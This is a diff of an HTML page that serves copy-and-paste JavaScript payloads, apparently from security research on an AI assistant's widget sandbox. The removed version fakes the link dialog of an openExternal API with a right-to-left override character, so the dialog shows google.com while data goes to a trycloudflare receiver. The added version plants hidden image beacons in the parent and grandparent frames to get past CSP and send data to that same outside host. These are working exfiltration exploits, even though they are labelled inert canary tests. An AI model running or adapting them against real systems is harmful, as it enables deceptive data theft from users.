@@ -1,51 +1,101 @@
 <!DOCTYPE html>
-<html><head><meta charset="utf-8"><title>T59</title>
+<html><head><meta charset="utf-8"><title>T60</title>
 <style>body{font:14px Menlo,monospace;background:#111;color:#ddd;max-width:900px;margin:40px auto;padding:0 16px}
 pre{background:#1b1b1b;border:1px solid #333;border-radius:8px;padding:16px;white-space:pre-wrap;word-break:break-all}
 button{font:16px Menlo,monospace;background:#ff5252;color:#fff;border:none;border-radius:6px;padding:10px 18px;cursor:pointer;margin:8px 0}
 button:hover{background:#ff7a7a}</style></head>
 <body>
-<h2>T59 CLEAN COPY PAGE</h2>
+<h2>T60 CLEAN COPY PAGE</h2>
 <p>Copy the whole payload below (or click the button), paste into the playground, run once.</p>
 <button onclick="navigator.clipboard.writeText(document.getElementById(&quot;code&quot;).textContent).then(function(){this.textContent=&quot;COPIED - paste into playground&quot;;}.bind(this))">Copy code</button>
-<pre id="code">// T59 - FULL CHAIN, INERT: bidi-spoofed openExternal delivers
-// clearly-labeled canary data to the researcher&#x27;s own receiver.
-// Raw URL (what the gate/browser see):
-//   https://[RLO]1=knil@same-disc-constructed-brussels.trycloudflare.com/leak?d=T59-CANARY-bidi-fullchain-inert/moc.elgoog.www
-// Dialog DISPLAY (computed, deterministic): leads with
-//   https://www.google.com/...  - the canary data renders MIRRORED
-//   (unreadable to the victim) - while the browser navigates to the
-//   receiver with the data in CLEAR TEXT.
-// This time you DO click &quot;Open link&quot; - that one (deceived) click is
-// the point of the test: the receiver should log the canary even
-// though the dialog said google.
+<pre id="code">// T60 - IMG-BEACON EXFIL AT EVERY REALM LEVEL (inert canary to the
+// researcher&#x27;s own receiver; zero clicks, no dialog, no fetch).
+// Statics (T18, Oct 19): the middle &quot;panel&quot; document carries a CSP
+// with img-src allowlist (example.com image was BLOCKED there),
+// but the RUNNER document above it has NO img-src at all (header
+// CSP without it) -&gt; an &lt;img&gt; appended to the runner DOM should
+// load from ARBITRARY servers. fetch() was measured blocked in
+// both realms (T43) - but img-src and connect-src are different
+// CSP keys; this test fires image beacons at:
+//   L0 = our own widget document (control)
+//   L1 = parent document (the panel - expect CSP block)
+//   L2 = parent.parent document (the runner - the prediction: GO)
+// Ground truth = the receiver log (an &lt;img&gt; of a text response
+// fires onerror even when the request ARRIVED - banner is only a
+// hint, the log decides).
 (function () {
-  var URL_T59 = &quot;https://\u202E1=knil@same-disc-constructed-brussels.trycloudflare.com/leak?d=T59-CANARY-bidi-fullchain-inert/moc.elgoog.www&quot;;
+  var RECEIVER = &quot;https://same-disc-constructed-brussels.trycloudflare.com&quot;;
+  var d0 = document;
+  var box = d0.createElement(&quot;div&quot;);
+  box.id = &quot;t60-box&quot;;
+  box.style.cssText = &quot;position:fixed;left:12px;bottom:12px;z-index:2147483647;font:12px Menlo,monospace;color:#ff5252;background:rgba(0,0,0,.85);border:1px solid #ff5252;border-radius:6px;padding:8px 10px;max-width:80vw;max-height:60vh;overflow:auto;white-space:pre-wrap;word-break:break-all&quot;;
+  d0.body.appendChild(box);
+  var lines = [&quot;T60 IMG BEACON (inert), zero clicks:&quot;];
 
-  var d = document;
-  var box = d.createElement(&quot;div&quot;);
-  box.id = &quot;t59-box&quot;;
-  box.style.cssText = &quot;position:fixed;left:12px;bottom:12px;z-index:2147483647;font:12px Menlo,monospace;color:#ff5252;background:rgba(0,0,0,.85);border:1px solid #ff5252;border-radius:6px;padding:8px 10px;max-width:80vw;white-space:pre-wrap&quot;;
-  box.textContent = &quot;T59 FULL CHAIN (inert) - firing in 1s. This time: READ the dialog, then CLICK Open link.&quot;;
-  d.body.appendChild(box);
-
-  setTimeout(function () {
-    var api = window.oai || window.openai || window.webplus;
-    if (!api || !api.openExternal) {
-      box.textContent = &quot;T59: no oai.openExternal API found&quot;;
-      return;
-    }
+  function beacon(doc, tag) {
     try {
-      api.openExternal({ href: URL_T59 });
-      box.textContent =
-        &quot;T59 FIRED (inert).\n\n1. The dialog should read https://www.google.com/...\n&quot; +
-        &quot;2. CLICK &#x27;Open link&#x27; - the tab goes to OUR receiver (inert)\n&quot; +
-        &quot;3. The receiver logs the canary = EXFILTRATION COMPLETE\n&quot; +
-        &quot;   despite the dialog saying google.&quot;;
+      var img = doc.createElement(&quot;img&quot;);
+      img.style.cssText = &quot;position:fixed;left:-9999px;bottom:0;width:1px;height:1px&quot;;
+      img.onload = function () { lines.push(tag + &quot;: ONLOAD (request completed OK)&quot;); box.textContent = lines.join(&quot;\n&quot;); };
+      img.onerror = function () { lines.push(tag + &quot;: ONERROR (maybe still sent - log decides)&quot;); box.textContent = lines.join(&quot;\n&quot;); };
+      img.src = RECEIVER + &quot;/leak?d=&quot; + encodeURIComponent(tag) + &quot;&amp;nc=&quot; + Date.now();
+      var mount = doc.body || doc.documentElement;
+      mount.appendChild(img);
+      lines.push(tag + &quot;: img appended to &quot; + (doc.body ? &quot;body&quot; : &quot;documentElement&quot;));
     } catch (e) {
-      box.textContent = &quot;T59 threw: &quot; + e;
+      lines.push(tag + &quot;: APPEND FAILED - &quot; + e);
     }
-  }, 1000);
+    box.textContent = lines.join(&quot;\n&quot;);
+  }
+
+  function hostOf(w) {
+    try { return w.location.host || &quot;(no host)&quot;; }
+    catch (e) { return &quot;(cross-origin blocked)&quot;; }
+  }
+
+  // CSP violation listeners on every reachable document
+  function listen(doc, tag) {
+    try {
+      doc.addEventListener(&quot;securitypolicyviolation&quot;, function (ev) {
+        lines.push(tag + &quot; CSP VIOLATION: &quot; + (ev.violatedDirective || &quot;?&quot;) + &quot; -&gt; &quot; + (ev.blockedURI || &quot;?&quot;));
+        box.textContent = lines.join(&quot;\n&quot;);
+      });
+    } catch (e) {}
+  }
+
+  // L0: own document (control)
+  listen(d0, &quot;L0&quot;);
+  beacon(d0, &quot;T60-L0-widget-doc&quot;);
+
+  // L1: parent
+  try {
+    var P = window.parent;
+    if (P &amp;&amp; P !== window) {
+      lines.push(&quot;L1 parent accessible, host: &quot; + hostOf(P));
+      listen(P.document, &quot;L1&quot;);
+      beacon(P.document, &quot;T60-L1-parent-doc&quot;);
+      // L2: parent.parent (runner)
+      try {
+        var R = P.parent;
+        if (R &amp;&amp; R !== P) {
+          lines.push(&quot;L2 parent.parent accessible, host: &quot; + hostOf(R));
+          listen(R.document, &quot;L2&quot;);
+          beacon(R.document, &quot;T60-L2-runner-doc&quot;);
+        } else {
+          lines.push(&quot;L2: parent.parent === parent (only two levels)&quot;);
+        }
+      } catch (e) {
+        lines.push(&quot;L2: ACCESS FAILED - &quot; + e);
+      }
+    } else {
+      lines.push(&quot;L1: no parent (top-level?)&quot;);
+    }
+  } catch (e) {
+    lines.push(&quot;L1: ACCESS FAILED - &quot; + e);
+  }
+
+  lines.push(&quot;(wait a few seconds; the receiver log is ground truth)&quot;);
+  box.textContent = lines.join(&quot;\n&quot;);
 })();
 </pre>
 </body></html>
